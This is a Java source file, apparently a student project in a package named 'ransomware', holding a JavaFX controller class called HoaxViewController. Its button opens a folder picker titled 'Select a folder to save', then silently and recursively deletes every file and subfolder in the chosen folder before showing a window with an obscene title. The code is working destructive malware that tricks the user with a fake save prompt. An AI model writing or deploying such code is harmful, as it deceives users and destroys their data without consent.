package lk.ijse.dep12.ransomware.controller;

import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import javafx.stage.DirectoryChooser;
import javafx.stage.Stage;

import java.io.File;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;

public class HoaxViewController {
    public Button btnSeeMe;

    public void btnSeeMeOnAction(ActionEvent actionEvent) throws IOException {
        DirectoryChooser directoryChooser = new DirectoryChooser();
        directoryChooser.setTitle("Select a folder to save");
        File folder = directoryChooser.showDialog(btnSeeMe.getScene().getWindow());
        if (folder != null) {
            ((Stage) (btnSeeMe.getScene().getWindow())).close();
            deleteFiles(folder.toPath());
            Stage stage = new Stage();
            stage.setTitle("Go Fuck Yourself");
            stage.setScene(new Scene(FXMLLoader.load(getClass().getResource("/view/MainView.fxml"))));
            stage.show();
            stage.centerOnScreen();
        }
    }

    private void deleteFiles(Path folder) throws IOException {
        Files.walkFileTree(folder, new SimpleFileVisitor<>() {
            @Override
            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                Files.delete(file);
                return super.visitFile(file, attrs);
            }

            @Override
            public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
                Files.delete(dir);
                return super.postVisitDirectory(dir, exc);
            }
        });
    }
}
